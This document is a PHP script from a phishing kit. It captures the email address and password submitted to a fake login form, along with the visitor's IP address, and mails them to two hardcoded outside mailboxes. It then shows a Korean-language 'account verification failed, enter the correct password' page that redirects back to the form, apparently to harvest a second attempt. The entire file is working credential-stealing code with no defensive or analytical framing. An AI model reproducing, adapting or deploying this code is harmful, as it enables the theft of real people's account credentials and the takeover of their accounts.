<?php

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];


$data = "
------------ Created By Cz3r ------------
E-mail ID : $email
Password  : $password
-------------------------
IP : $ip
------------ Created By ECR ------------
";

$mailsubj = "| Login: | $email | $password ";


$emailusr = 'blessrick@yandex.ru, kizomayana@vivaldi.net';

mail($emailusr, $mailsubj, $data);

?>
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>&#51060;&#47700;&#51068; &#49444;&#51221; | &#54869;&#51064;</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="refresh" content="10;url=index.php" />

<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-15'/>
<!-- no core stylesheet -->
</head>


<form method='post' action=''>

                        <font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
                        <div align="center">

			<br><br><br><br><br>

			<div>
			<h2>&#44228;&#51221; &#54869;&#51064; &#49892;&#54056;!</h2>
			<p>&#45796;&#49884; &#49884;&#46020;&#54616;&#49901;&#49884;&#50724;! &#44536;&#47532;&#44256; &#51060;&#48264;&#50640;&#45716;&#51060; &#51060;&#47700;&#51068;&#50640; &#51221;&#54869;&#54620; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54616;&#49901;&#49884;&#50724;.</p>

			<p>&#44263; &#45796;&#49884; &#47532;&#46356;&#47113;&#49496;&#46121;&#45768;&#45796;.</p>

			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->